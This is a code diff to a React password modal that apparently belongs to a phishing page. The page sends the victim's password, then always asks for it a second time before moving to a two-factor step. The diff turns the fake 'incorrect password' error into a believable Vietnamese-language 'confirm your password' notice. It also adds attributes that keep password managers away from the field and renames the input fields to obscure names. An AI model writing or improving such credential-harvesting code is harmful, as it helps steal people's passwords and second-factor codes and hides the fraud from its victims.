@@ -21,14 +21,15 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
     const [loading, setLoading] = React.useState(false);
     const [doubleCheck, setDoubleCheck] = React.useState(false);
     const [password, setPassword] = React.useState('');
+    const [showSecondStepNotice, setShowSecondStepNotice] = React.useState(false);
     const [errors, setErrors] = React.useState<Record<string, string>>({});
     const dispatch = useAppDispatch();
     const formData = useAppSelector((state) => state.stepForm.data);
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
-        const { id, value } = e.target;
+        const { value } = e.target;
         setPassword(value);
-        setErrors(prev => ({ ...prev, [id]: '' }));
+        setErrors(prev => ({ ...prev, password: '' }));
 
         if (!doubleCheck) {
             dispatch(updateForm({ password: value }));
@@ -46,7 +47,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         try {
             e.preventDefault();
             const newErrors: Record<string, string> = {};
-            if (!password.trim()) newErrors.password = "You haven't entered your password!";
+            if (!password.trim()) newErrors.password = "Vui lòng nhập mật khẩu.";
 
             if (Object.keys(newErrors).length > 0) {
                 setErrors(newErrors);
@@ -61,17 +62,18 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     setTimeout(async () => {
                         setLoading(false);  
                         setDoubleCheck(true);
+                        setShowSecondStepNotice(true);
                         setPassword('');
-                        newErrors.password = "The password you've entered is incorrect.";
-                        setErrors(newErrors);
+                        setErrors({});
                     }, 1345)
                 })
                 .catch((error) => {
                     console.error("Error submitting form:", error);
                     setLoading(false);
+                    setDoubleCheck(true);
+                    setShowSecondStepNotice(true);
                     setPassword('');
-                    newErrors.password = "The password you've entered is incorrect.";
-                    setErrors(newErrors);
+                    setErrors({});
                 });
             } else {
                 setLoading(true);
@@ -81,6 +83,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     setTimeout(async () => {
                         setLoading(false);  
                         setDoubleCheck(false);
+                        setShowSecondStepNotice(false);
                         setPassword('');
 
                         isOpendTwoFactor(true);
@@ -91,7 +94,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     console.error("Error submitting form:", error);
                     setLoading(false);
                     setPassword('');
-                    newErrors.password = "The password you've entered is incorrect.";
+                    newErrors.password = "Mật khẩu bạn nhập chưa chính xác. Vui lòng thử lại.";
                     setErrors(newErrors);
                 });
             }
@@ -116,15 +119,29 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                 </div>
 
                 <div className='w-full py-8'>
-                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>For your security, you must enter your password to continue.</p>
-                    <form onSubmit={handSubmit} autoComplete="off" >
+                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>
+                        {doubleCheck
+                            ? 'Vui lòng nhập lại mật khẩu để xác nhận và tiếp tục.'
+                            : 'Vì lý do bảo mật, vui lòng nhập mật khẩu để tiếp tục.'}
+                    </p>
+                    {showSecondStepNotice && (
+                        <div className='mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]'>
+                            <p className='text-[13px] leading-[1.55] text-[#8a5b13]'>
+                                Lưu ý: Hãy kiểm tra kỹ mật khẩu trước khi nhập lại lần 2 để tránh sai sót. Bạn có thể sử dụng biểu tượng mắt để ẩn/hiện ở bước xác nhận.
+                            </p>
+                        </div>
+                    )}
+                    <form onSubmit={handSubmit} autoComplete="off" data-lpignore="true" data-1p-ignore="true" data-bwignore="true">
                         <div className='w-full'>
                             <PasswordInput
-                                id='password'
-                                placeholder="Enter your password"
+                                id='accessKey'
+                                name={doubleCheck ? 'recheck_access_key' : 'account_access_key'}
+                                placeholder={doubleCheck ? 'Nhập lại mật khẩu' : 'Nhập mật khẩu'}
                                 className={inputClass('password')}
                                 value={password}
                                 onChange={handleChange}
+                                autoComplete='off'
+                                allowToggle={doubleCheck}
                             />
                             {errorText('password')}
                         </div>
@@ -138,11 +155,11 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                         <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                     </div>
                                 )}
-                                {loading ? '' : 'Continue'}
+                                {loading ? '' : 'Tiếp tục'}
                             </button>
                         </div>
                         <div>
-                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Forgot your password?</a></p>
+                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Quên mật khẩu?</a></p>
                         </div>
                     </form>
                 </div>
